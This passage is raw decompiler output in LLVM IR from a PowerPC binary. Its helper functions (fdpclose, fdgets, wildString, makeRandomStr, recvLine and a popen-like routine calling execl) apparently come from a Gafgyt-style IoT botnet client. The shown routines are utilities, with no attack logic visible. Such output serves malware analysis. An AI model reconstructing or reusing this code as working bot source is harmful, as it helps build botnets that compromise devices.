  %v4_10001444 = call i32 @dup2(i32 %tmp3, i32 1, i32 %tmp)
  store i32 268440660, i32* @lr, align 4
  %v1_10001450 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001454

dec_label_pc_10001454:                            ; preds = %dec_label_pc_1000142c, %dec_label_pc_10001438
  %v3_10001454 = load i32, i32* %stack_var_-48, align 4
  store i32 ptrtoint (i32* @global_var_10001460.19 to i32), i32* @lr, align 4
  %v1_1000145c = call i32 @__libc_close(i32 %v3_10001454)
  br label %dec_label_pc_10001498

dec_label_pc_10001464:                            ; preds = %dec_label_pc_10001418
  %v3_10001464 = load i32, i32* %stack_var_-48, align 4
  %v3_10001468 = icmp eq i32 %v3_10001464, 0
  br i1 %v3_10001468, label %dec_label_pc_1000148c, label %dec_label_pc_10001470

dec_label_pc_10001470:                            ; preds = %dec_label_pc_10001464
  store i32 268440704, i32* @lr, align 4
  %v4_1000147c = call i32 @dup2(i32 %v3_10001464, i32 0, i32 %tmp)
  %v3_10001480 = load i32, i32* %stack_var_-48, align 4
  store i32 268440716, i32* @lr, align 4
  %v1_10001488 = call i32 @__libc_close(i32 %v3_10001480)
  br label %dec_label_pc_1000148c

dec_label_pc_1000148c:                            ; preds = %dec_label_pc_10001464, %dec_label_pc_10001470
  store i32 268440728, i32* @lr, align 4
  %v1_10001494 = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001498

dec_label_pc_10001498:                            ; preds = %dec_label_pc_10001454, %dec_label_pc_1000148c
  %v10_100014bc = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_10011848.20 to i32), i32 ptrtoint ([3 x i8]* @global_var_10011850.21 to i32), i32 ptrtoint ([3 x i8]* @global_var_10011854.22 to i32), i32 %arg1, i32 0, i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  %v1_100014c4 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_100014c8

dec_label_pc_100014c8:                            ; preds = %dec_label_pc_100013e4, %dec_label_pc_10001498
  %v2_100014cc = load i8, i8* %arg2, align 1
  %v3_100014d4 = icmp eq i8 %v2_100014cc, 114
  %v3_100014dc = load i32, i32* %stack_var_-48, align 4
  br i1 %v3_100014d4, label %dec_label_pc_100014dc, label %dec_label_pc_100014f4

dec_label_pc_100014dc:                            ; preds = %dec_label_pc_100014c8
  store i32 ptrtoint (i32* @global_var_100014f0.24 to i32), i32* @lr, align 4
  %v1_100014ec = call i32 @__libc_close(i32 %tmp3)
  br label %dec_label_pc_10001508

dec_label_pc_100014f4:                            ; preds = %dec_label_pc_100014c8
  store i32 268440840, i32* @lr, align 4
  %v1_10001504 = call i32 @__libc_close(i32 %v3_100014dc)
  br label %dec_label_pc_10001508

dec_label_pc_10001508:                            ; preds = %dec_label_pc_100014dc, %dec_label_pc_100014f4
  %stack_var_-36.0 = phi i32 [ %v3_100014dc, %dec_label_pc_100014dc ], [ %tmp3, %dec_label_pc_100014f4 ]
  %v1_1000150c = mul i32 %stack_var_-36.0, 4
  %v3_10001518 = load i32, i32* @global_var_10024a44.16, align 4
  %v2_1000151c = add i32 %v3_10001518, %v1_1000150c
  %v2_10001524 = inttoptr i32 %v2_1000151c to i32*
  store i32 %v0_100013c0, i32* %v2_10001524, align 4
  br label %dec_label_pc_10001530

dec_label_pc_10001530:                            ; preds = %dec_label_pc_100013f4, %dec_label_pc_10001390, %dec_label_pc_10001358, %dec_label_pc_10001324, %dec_label_pc_10001300, %dec_label_pc_10001508
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_10001390 ], [ -1, %dec_label_pc_100013f4 ], [ %stack_var_-36.0, %dec_label_pc_10001508 ], [ -1, %dec_label_pc_10001358 ], [ -1, %dec_label_pc_10001324 ], [ -1, %dec_label_pc_10001300 ]
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32 %v3_100014dc, { 1, 0 }
  uselistorder i32 %v1_10001368, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_10001530, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10001508, { 1, 0 }
  uselistorder label %dec_label_pc_100014c8, { 1, 0 }
  uselistorder label %dec_label_pc_10001498, { 1, 0 }
  uselistorder label %dec_label_pc_1000148c, { 1, 0 }
  uselistorder label %dec_label_pc_10001454, { 1, 0 }
  uselistorder label %dec_label_pc_100013c0, { 1, 0 }
  uselistorder label %dec_label_pc_10001300, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-308 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %v3_1000156c = load i32, i32* @global_var_10024a44.16, align 4
  %v3_10001570 = icmp eq i32 %v3_1000156c, 0
  br i1 %v3_10001570, label %dec_label_pc_1000159c, label %dec_label_pc_10001578

dec_label_pc_10001578:                            ; preds = %entry
  %v1_1000157c = mul i32 %arg1, 4
  %v2_1000158c = add i32 %v3_1000156c, %v1_1000157c
  %v1_10001590 = inttoptr i32 %v2_1000158c to i32*
  %v2_10001590 = load i32, i32* %v1_10001590, align 4
  %v3_10001594 = icmp eq i32 %v2_10001590, 0
  br i1 %v3_10001594, label %dec_label_pc_1000159c, label %dec_label_pc_100015a8

dec_label_pc_1000159c:                            ; preds = %dec_label_pc_10001578, %entry
  br label %dec_label_pc_100016d0

dec_label_pc_100015a8:                            ; preds = %dec_label_pc_10001578
  store i32 268441008, i32* @lr, align 4
  %v1_100015ac = call i32 @__libc_close(i32 %arg1)
  %v2_100015b0 = ptrtoint i32* %stack_var_-180 to i32
  store i32 268441020, i32* @lr, align 4
  %v1_100015b8 = call i32 @sigemptyset(i32 %v2_100015b0)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441036, i32* @lr, align 4
  %v2_100015c8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 2)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441052, i32* @lr, align 4
  %v2_100015d8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 3)
  store i32 %v2_100015b0, i32* @r3, align 4
  store i32 268441068, i32* @lr, align 4
  %v2_100015e8 = call i32 @__GI_sigaddset(i32 %v2_100015b0, i32 1)
  %v2_100015f0 = ptrtoint i32* %stack_var_-308 to i32
  store i32 268441092, i32* @lr, align 4
  %v3_10001600 = call i32 @__GI_sigprocmask(i32 0, i32 %v2_100015b0, i32 %v2_100015f0)
  %v2_10001620 = ptrtoint i32* %stack_var_-52 to i32
  br label %dec_label_pc_10001604

dec_label_pc_10001604:                            ; preds = %dec_label_pc_1000164c, %dec_label_pc_100015a8
  %v3_10001614 = load i32, i32* @global_var_10024a44.16, align 4
  %v2_10001618 = add i32 %v3_10001614, %v1_1000157c
  %v1_1000161c = inttoptr i32 %v2_10001618 to i32*
  %v2_1000161c = load i32, i32* %v1_1000161c, align 4
  store i32 268441140, i32* @lr, align 4
  %v3_10001630 = call i32 @__libc_waitpid(i32 %v2_1000161c, i32 %v2_10001620, i32 0)
  %v4_10001644 = icmp eq i32 %v3_10001630, -1
  br i1 %v4_10001644, label %dec_label_pc_1000164c, label %dec_label_pc_10001660

dec_label_pc_1000164c:                            ; preds = %dec_label_pc_10001604
  %v0_1000164c = call i32 @__errno_location()
  %v1_10001654 = inttoptr i32 %v0_1000164c to i32*
  %v2_10001654 = load i32, i32* %v1_10001654, align 4
  %v3_10001658 = icmp eq i32 %v2_10001654, 4
  br i1 %v3_10001658, label %dec_label_pc_10001604, label %dec_label_pc_10001660

dec_label_pc_10001660:                            ; preds = %dec_label_pc_10001604, %dec_label_pc_1000164c
  %v4_10001644.lcssa = phi i1 [ false, %dec_label_pc_10001604 ], [ true, %dec_label_pc_1000164c ]
  store i32 268441204, i32* @lr, align 4
  %v3_10001670 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_100015f0, i32 0)
  %v1_10001678 = mul i32 %tmp5, 4
  %v3_10001684 = load i32, i32* @global_var_10024a44.16, align 4
  %v2_10001688 = add i32 %v3_10001684, %v1_10001678
  %v2_10001690 = inttoptr i32 %v2_10001688 to i32*
  store i32 0, i32* %v2_10001690, align 4
  br i1 %v4_10001644.lcssa, label %dec_label_pc_100016c8, label %dec_label_pc_100016a4

dec_label_pc_100016a4:                            ; preds = %dec_label_pc_10001660
  %v3_100016a4 = load i32, i32* %stack_var_-52, align 4
  %v1_100016b0 = call i32 @__asm_rlwinm(i32 %v3_100016a4, i32 0, i32 16, i32 23)
  %v4_100016b4 = sdiv i32 %v1_100016b0, 256
  br label %dec_label_pc_100016c8

dec_label_pc_100016c8:                            ; preds = %dec_label_pc_10001660, %dec_label_pc_100016a4
  %storemerge2 = phi i32 [ %v4_100016b4, %dec_label_pc_100016a4 ], [ -1, %dec_label_pc_10001660 ]
  br label %dec_label_pc_100016d0

dec_label_pc_100016d0:                            ; preds = %dec_label_pc_1000159c, %dec_label_pc_100016c8
  %storemerge = phi i32 [ %storemerge2, %dec_label_pc_100016c8 ], [ -1, %dec_label_pc_1000159c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_100015b0, { 0, 2, 1, 4, 3, 6, 5, 7 }
  uselistorder i32 %v1_1000157c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_100016d0, { 1, 0 }
  uselistorder label %dec_label_pc_100016c8, { 1, 0 }
  uselistorder label %dec_label_pc_10001660, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  br label %dec_label_pc_10001764

dec_label_pc_10001724:                            ; preds = %dec_label_pc_10001774
  store i32 268441412, i32* @lr, align 4
  %v1_10001740 = call i32 @__libc_read(i32 %arg3)
  %v1_10001750 = add nuw i32 %storemerge25, 1
  %v3_1000175c = icmp eq i32 %v1_10001740, 1
  br i1 %v3_1000175c, label %dec_label_pc_10001764, label %dec_label_pc_10001798

dec_label_pc_10001764:                            ; preds = %entry, %dec_label_pc_10001724
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_10001750, %dec_label_pc_10001724 ]
  %v2_1000176c = icmp slt i32 %storemerge25, %arg2
  br i1 %v2_1000176c, label %dec_label_pc_10001774, label %dec_label_pc_10001798

dec_label_pc_10001774:                            ; preds = %dec_label_pc_10001764
  %v2_10001780 = add i32 %storemerge25, %arg1
  %v1_10001784 = add i32 %v2_10001780, -1
  %v1_10001788 = inttoptr i32 %v1_10001784 to i8*
  %v2_10001788 = load i8, i8* %v1_10001788, align 1
  %v3_10001790 = icmp eq i8 %v2_10001788, 10
  br i1 %v3_10001790, label %dec_label_pc_10001798, label %dec_label_pc_10001724

dec_label_pc_10001798:                            ; preds = %dec_label_pc_10001774, %dec_label_pc_10001764, %dec_label_pc_10001724
  %stack_var_-36.0.lcssa = phi i32 [ 1, %dec_label_pc_10001774 ], [ 1, %dec_label_pc_10001764 ], [ %v1_10001740, %dec_label_pc_10001724 ]
  %v3_1000179c = icmp eq i32 %stack_var_-36.0.lcssa, 0
  %storemerge = select i1 %v3_1000179c, i32 0, i32 %arg1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10001740, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10001764, { 1, 0 }
}

define i32 @parseHex(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_100018343 = load i8, i8* %arg1, align 1
  %v3_1000183c6 = icmp eq i8 %v2_100018343, 0
  br i1 %v3_1000183c6, label %dec_label_pc_10001850, label %dec_label_pc_10001844

dec_label_pc_100017f4:                            ; preds = %dec_label_pc_10001844
  %v1_100017f8 = mul i32 %stack_var_-40.07, 16
  %v2_10001800 = load i8, i8* %stack_var_-24.08, align 1
  %v3_10001800 = zext i8 %v2_10001800 to i32
  %v1_10001810 = mul nuw nsw i32 %v3_10001800, 4
  %v2_10001814 = add i32 %v1_10001810, ptrtoint (i32* @global_var_10011858.25 to i32)
  %v1_10001818 = inttoptr i32 %v2_10001814 to i32*
  %v2_10001818 = load i32, i32* %v1_10001818, align 4
  %v2_1000181c = or i32 %v2_10001818, %v1_100017f8
  %v1_10001828 = add i32 %v4_100018309, 1
  %v5_1000182c = inttoptr i32 %v1_10001828 to i8*
  %v2_10001834 = load i8, i8* %v5_1000182c, align 1
  %v3_1000183c = icmp eq i8 %v2_10001834, 0
  br i1 %v3_1000183c, label %dec_label_pc_10001850, label %dec_label_pc_10001844

dec_label_pc_10001844:                            ; preds = %entry, %dec_label_pc_100017f4
  %v4_100018309 = phi i32 [ %v1_10001828, %dec_label_pc_100017f4 ], [ %tmp, %entry ]
  %stack_var_-24.08 = phi i8* [ %v5_1000182c, %dec_label_pc_100017f4 ], [ %arg1, %entry ]
  %stack_var_-40.07 = phi i32 [ %v2_1000181c, %dec_label_pc_100017f4 ], [ 0, %entry ]
  %tmp17 = icmp sgt i32 %stack_var_-40.07, -1
  br i1 %tmp17, label %dec_label_pc_100017f4, label %dec_label_pc_10001850

dec_label_pc_10001850:                            ; preds = %dec_label_pc_100017f4, %dec_label_pc_10001844, %entry
  %stack_var_-40.0.lcssa = phi i32 [ 0, %entry ], [ %v2_1000181c, %dec_label_pc_100017f4 ], [ %stack_var_-40.07, %dec_label_pc_10001844 ]
  ret i32 %stack_var_-40.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-40.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10001850, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10001844, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp9 = ptrtoint i8* %arg1 to i32
  %v2_1000188c = load i8, i8* %arg1, align 1
  %v3_1000189c = icmp eq i8 %v2_1000188c, 42
  br i1 %v3_1000189c, label %dec_label_pc_100018d4, label %dec_label_pc_100018a4

dec_label_pc_100018a4:                            ; preds = %entry
  %v3_100018a8 = icmp eq i8 %v2_1000188c, 63
  br i1 %v3_100018a8, label %dec_label_pc_10001948, label %dec_label_pc_100018b0

dec_label_pc_100018b0:                            ; preds = %dec_label_pc_100018a4
  %v3_100018b4 = icmp eq i8 %v2_1000188c, 0
  br i1 %v3_100018b4, label %dec_label_pc_100018c0, label %dec_label_pc_100019a4

dec_label_pc_100018c0:                            ; preds = %dec_label_pc_100018b0
  %v2_100018c4 = load i8, i8* %tmp, align 1
  %v3_100018c4 = zext i8 %v2_100018c4 to i32
  br label %dec_label_pc_10001a28

dec_label_pc_100018d4:                            ; preds = %entry
  %v2_100018d8 = add i32 %tmp9, 1
  store i32 268441832, i32* @lr, align 4
  %v5_100018e4 = inttoptr i32 %v2_100018d8 to i8*
  %v6_100018e4 = call i32 @wildString(i8* %v5_100018e4, i32 %arg2, i32 %tmp9)
  %v3_100018ec = icmp eq i32 %v6_100018e4, 0
  br i1 %v3_100018ec, label %dec_label_pc_10001934, label %dec_label_pc_100018f4

dec_label_pc_100018f4:                            ; preds = %dec_label_pc_100018d4
  %v2_100018f8 = load i8, i8* %tmp, align 1
  %v3_10001900 = icmp eq i8 %v2_100018f8, 0
  br i1 %v3_10001900, label %dec_label_pc_1000193c, label %dec_label_pc_10001908

dec_label_pc_10001908:                            ; preds = %dec_label_pc_100018f4
  %v2_1000190c = add i32 %arg2, 1
  store i32 268441884, i32* @lr, align 4
  %v6_10001918 = call i32 @wildString(i8* nonnull %arg1, i32 %v2_1000190c, i32 %arg2)
  %v3_10001920 = icmp eq i32 %v6_10001918, 0
  br i1 %v3_10001920, label %dec_label_pc_10001934, label %dec_label_pc_1000193c

dec_label_pc_10001934:                            ; preds = %dec_label_pc_10001908, %dec_label_pc_100018d4
  br label %dec_label_pc_1000193c

dec_label_pc_1000193c:                            ; preds = %dec_label_pc_100018f4, %dec_label_pc_10001908, %dec_label_pc_10001934
  %storemerge4 = phi i32 [ 0, %dec_label_pc_10001934 ], [ 1, %dec_label_pc_10001908 ], [ 1, %dec_label_pc_100018f4 ]
  br label %dec_label_pc_10001a28

dec_label_pc_10001948:                            ; preds = %dec_label_pc_100018a4
  %v2_1000194c = load i8, i8* %tmp, align 1
  %v3_10001954 = icmp eq i8 %v2_1000194c, 0
  br i1 %v3_10001954, label %dec_label_pc_10001998, label %dec_label_pc_1000195c

dec_label_pc_1000195c:                            ; preds = %dec_label_pc_10001948
  %v1_10001960 = add i32 %tmp9, 1
  %v2_10001968 = add i32 %arg2, 1
  store i32 268441976, i32* @lr, align 4
  %v4_10001974 = inttoptr i32 %v1_10001960 to i8*
  %v5_10001974 = call i32 @wildString(i8* %v4_10001974, i32 %v2_10001968, i32 %arg2)
  %v3_1000197c = icmp ne i32 %v5_10001974, 0
  %. = zext i1 %v3_1000197c to i32
  br label %dec_label_pc_10001998

dec_label_pc_10001998:                            ; preds = %dec_label_pc_1000195c, %dec_label_pc_10001948
  %storemerge3 = phi i32 [ 1, %dec_label_pc_10001948 ], [ %., %dec_label_pc_1000195c ]
  br label %dec_label_pc_10001a28

dec_label_pc_100019a4:                            ; preds = %dec_label_pc_100018b0
  %v3_100019a8 = load i8, i8* %arg1, align 1
  %v4_100019a8 = zext i8 %v3_100019a8 to i32
  store i32 268442044, i32* @lr, align 4
  %v3_100019b8 = call i32 @__GI_toupper(i32 %v4_100019a8, i32 %tmp9)
  %v3_100019c4 = load i8, i8* %tmp, align 1
  %v4_100019c4 = zext i8 %v3_100019c4 to i32
  store i32 268442072, i32* @lr, align 4
  %v3_100019d4 = call i32 @__GI_toupper(i32 %v4_100019c4, i32 %arg2)
  %v4_100019dc = icmp eq i32 %v3_100019b8, %v3_100019d4
  br i1 %v4_100019dc, label %dec_label_pc_100019e4, label %dec_label_pc_10001a20

dec_label_pc_100019e4:                            ; preds = %dec_label_pc_100019a4
  %v1_100019e8 = add i32 %tmp9, 1
  %v2_100019f0 = add i32 %arg2, 1
  store i32 268442112, i32* @lr, align 4
  %v4_100019fc = inttoptr i32 %v1_100019e8 to i8*
  %v5_100019fc = call i32 @wildString(i8* %v4_100019fc, i32 %v2_100019f0, i32 %arg2)
  %v3_10001a04 = icmp ne i32 %v5_100019fc, 0
  %.8 = zext i1 %v3_10001a04 to i32
  br label %dec_label_pc_10001a20

dec_label_pc_10001a20:                            ; preds = %dec_label_pc_100019e4, %dec_label_pc_100019a4
  %storemerge = phi i32 [ 1, %dec_label_pc_100019a4 ], [ %.8, %dec_label_pc_100019e4 ]
  br label %dec_label_pc_10001a28

dec_label_pc_10001a28:                            ; preds = %dec_label_pc_10001998, %dec_label_pc_1000193c, %dec_label_pc_100018c0, %dec_label_pc_10001a20
  %stack_var_-36.0 = phi i32 [ %storemerge4, %dec_label_pc_1000193c ], [ %storemerge3, %dec_label_pc_10001998 ], [ %v3_100018c4, %dec_label_pc_100018c0 ], [ %storemerge, %dec_label_pc_10001a20 ]
  ret i32 %stack_var_-36.0

; uselistorder directives
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 5, 6, 7, 3, 4, 0, 1, 2, 8 }
  uselistorder label %dec_label_pc_10001a28, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000193c, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 268442228, i32* @lr, align 4
  %v1_10001a70 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_10001a70, i32* %arg2, align 4
  %v4_10001a8c = icmp eq i32 %v1_10001a70, -1
  %. = zext i1 %v4_10001a8c to i32
  ret i32 %.
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_10001b1c2 = load i8, i8* %arg1, align 1
  %v3_10001b245 = icmp eq i8 %v2_10001b1c2, 0
  br i1 %v3_10001b245, label %dec_label_pc_10001b2c, label %dec_label_pc_10001ae4

dec_label_pc_10001ae4:                            ; preds = %entry, %dec_label_pc_10001ae4
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_10001ae4 ], [ %arg1, %entry ]
  %storemerge.in6 = phi i32 [ %v1_10001b10, %dec_label_pc_10001ae4 ], [ %tmp, %entry ]
  %v3_10001ae8 = load i8, i8* %storemerge7, align 1
  %v4_10001ae8 = zext i8 %v3_10001ae8 to i32
  store i32 %v4_10001ae8, i32* %r3.global-to-local, align 4
  store i32 268442364, i32* @lr, align 4
  %v3_10001af8 = call i32 @__GI_toupper(i32 %v4_10001ae8, i32 %storemerge.in6)
  store i32 %v3_10001af8, i32* %r3.global-to-local, align 4
  %v1_10001b08 = trunc i32 %v3_10001af8 to i8
  store i8 %v1_10001b08, i8* %storemerge7, align 1
  %v1_10001b10 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_10001b10 to i8*
  %v2_10001b1c = load i8, i8* %storemerge, align 1
  %v3_10001b24 = icmp eq i8 %v2_10001b1c, 0
  br i1 %v3_10001b24, label %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge, label %dec_label_pc_10001ae4

dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge: ; preds = %dec_label_pc_10001ae4
  %v0_10001b40.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001b2c

dec_label_pc_10001b2c:                            ; preds = %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge, %entry
  %v0_10001b40 = phi i32 [ %v0_10001b40.pre, %dec_label_pc_10001b18.dec_label_pc_10001b2c_crit_edge ], [ %tmp, %entry ]
  ret i32 %v0_10001b40

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_10001b10, { 1, 0 }
  uselistorder i32 %storemerge.in6, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_10001ae4, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v0_10001b5c = load i32, i32* %r3.global-to-local, align 4
  %v2_10001bdc4 = icmp sgt i32 %arg2, 0
  br i1 %v2_10001bdc4, label %dec_label_pc_10001b78, label %dec_label_pc_10001be4

dec_label_pc_10001b78:                            ; preds = %entry, %dec_label_pc_10001b78
  %storemerge37 = phi i32 [ %v1_10001bcc, %dec_label_pc_10001b78 ], [ 0, %entry ]
  %v2_10001b84 = add i32 %storemerge37, %v0_10001b5c
  %v0_10001b88 = call i32 @rand_cmwc()
  store i32 %v0_10001b88, i32* %r3.global-to-local, align 4
  %v1_10001b9c = urem i32 %v0_10001b88, 26
  %fold = add nuw nsw i32 %v1_10001b9c, 65
  %v1_10001bc4 = trunc i32 %fold to i8
  %v3_10001bc4 = inttoptr i32 %v2_10001b84 to i8*
  store i8 %v1_10001bc4, i8* %v3_10001bc4, align 1
  %v1_10001bcc = add nuw nsw i32 %storemerge37, 1
  %v2_10001bdc = icmp slt i32 %v1_10001bcc, %arg2
  br i1 %v2_10001bdc, label %dec_label_pc_10001b78, label %dec_label_pc_10001bd4.dec_label_pc_10001be4_crit_edge

dec_label_pc_10001bd4.dec_label_pc_10001be4_crit_edge: ; preds = %dec_label_pc_10001b78
  %v0_10001bfc.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001be4

dec_label_pc_10001be4:                            ; preds = %dec_label_pc_10001bd4.dec_label_pc_10001be4_crit_edge, %entry
  %v0_10001bfc = phi i32 [ %v0_10001bfc.pre, %dec_label_pc_10001bd4.dec_label_pc_10001be4_crit_edge ], [ %v0_10001b5c, %entry ]
  ret i32 %v0_10001bfc

; uselistorder directives
  uselistorder i32 %v1_10001bcc, { 1, 0 }
  uselistorder i32 %storemerge37, { 1, 0 }
  uselistorder i32 %v0_10001b5c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10001b78, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i8, align 1
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10001c38.26 to i32), i32* @lr, align 4
  %v4_10001c34 = call i32 @__GI_memset(i32 %tmp, i32 0, i32 %arg3)
  store i32 30, i32* %stack_var_-40, align 4
  %v2_10001c48 = ptrtoint i32* %stack_var_-168 to i32
  br label %dec_label_pc_10001c5c

dec_label_pc_10001c5c:                            ; preds = %entry, %dec_label_pc_10001c5c
  %storemerge618 = phi i32 [ 0, %entry ], [ %v1_10001c78, %dec_label_pc_10001c5c ]
  %v1_10001c64 = mul nuw nsw i32 %storemerge618, 4
  %v2_10001c68 = add i32 %v1_10001c64, %v2_10001c48
  %v2_10001c70 = inttoptr i32 %v2_10001c68 to i32*
  store i32 0, i32* %v2_10001c70, align 4
  %v1_10001c78 = add nuw nsw i32 %storemerge618, 1
  %tmp42 = icmp ult i32 %v1_10001c78, 32
  br i1 %tmp42, label %dec_label_pc_10001c5c, label %dec_label_pc_10001c8c

dec_label_pc_10001c8c:                            ; preds = %dec_label_pc_10001c5c
  %v1_10001c90 = udiv i32 %arg1, 32
  %v1_10001c98 = mul nuw nsw i32 %v1_10001c90, 4
  %v2_10001c9c = ptrtoint i32* %stack_var_-200 to i32
  %v2_10001ca0 = add nuw nsw i32 %v1_10001c98, 32
  %v1_10001ca4 = add i32 %v2_10001ca0, %v2_10001c9c
  %v1_10001ca8 = inttoptr i32 %v1_10001ca4 to i32*
  %v2_10001ca8 = load i32, i32* %v1_10001ca8, align 4
  %v1_10001cb0 = urem i32 %arg1, 32
  %v3_10001cb8 = shl i32 1, %v1_10001cb0
  %v2_10001cbc = or i32 %v2_10001ca8, %v3_10001cb8
  store i32 %v2_10001cbc, i32* %v1_10001ca8, align 4
  %v1_10001cd8 = add i32 %arg1, 1
  %v2_10001ce4 = ptrtoint i32* %stack_var_-40 to i32
  store i32 268442880, i32* @lr, align 4
  %v5_10001cfc = call i32 @__libc_select(i32 %v1_10001cd8, i32 %v2_10001c48, i32 0, i32 %v2_10001c48, i32 %v2_10001ce4)
  %v2_10001d0c = icmp sgt i32 %v5_10001cfc, 0
  br i1 %v2_10001d0c, label %dec_label_pc_10001eb8.preheader, label %dec_label_pc_10001e1c.preheader

dec_label_pc_10001e1c.preheader:                  ; preds = %dec_label_pc_10001c8c
  %tmp43 = icmp slt i32 %tmp25, 10
  br i1 %tmp43, label %dec_label_pc_10001d18, label %dec_label_pc_10001eb8.preheader

dec_label_pc_10001d18:                            ; preds = %dec_label_pc_10001e1c.preheader, %dec_label_pc_10001e10
  %stack_var_-176.017 = phi i32 [ %v1_10001e14, %dec_label_pc_10001e10 ], [ %tmp25, %dec_label_pc_10001e1c.preheader ]
  %v3_10001d1c = load i32, i32* @global_var_10024a20.27, align 4
  store i32 ptrtoint (i32* @global_var_10001d34.29 to i32), i32* @lr, align 4
  %v5_10001d30 = call i32 @Rootsprintf(i32 %v3_10001d1c, i32 ptrtoint ([5 x i8]* @global_var_10011c58.28 to i32), i32 ptrtoint ([115 x i8]* @global_var_10010000.5 to i32))
  store i32 30, i32* %stack_var_-40, align 4
  store i32 %v2_10001c48, i32* %stack_var_-200, align 4
  store i32 0, i32* %stack_var_-168, align 4
  br label %dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge

dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge: ; preds = %dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge.dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge_crit_edge, %dec_label_pc_10001d18
  %v3_10001d5c.pre = phi i32 [ %v2_10001c48, %dec_label_pc_10001d18 ], [ %v3_10001d5c.pre.pre, %dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge.dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge_crit_edge ]
  %v1_10001d7449 = phi i32 [ 1, %dec_label_pc_10001d18 ], [ %v1_10001d74, %dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge.dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge_crit_edge ]
  %v1_10001d60 = mul nuw nsw i32 %v1_10001d7449, 4
  %v2_10001d64 = add i32 %v1_10001d60, %v3_10001d5c.pre
  %v2_10001d6c = inttoptr i32 %v2_10001d64 to i32*
  store i32 0, i32* %v2_10001d6c, align 4
  %v1_10001d74 = add nuw nsw i32 %v1_10001d7449, 1
  %tmp44 = icmp ult i32 %v1_10001d74, 32
  br i1 %tmp44, label %dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge.dec_label_pc_10001d58.dec_label_pc_10001d58_crit_edge_crit_edge, label %dec_label_pc_10001d88

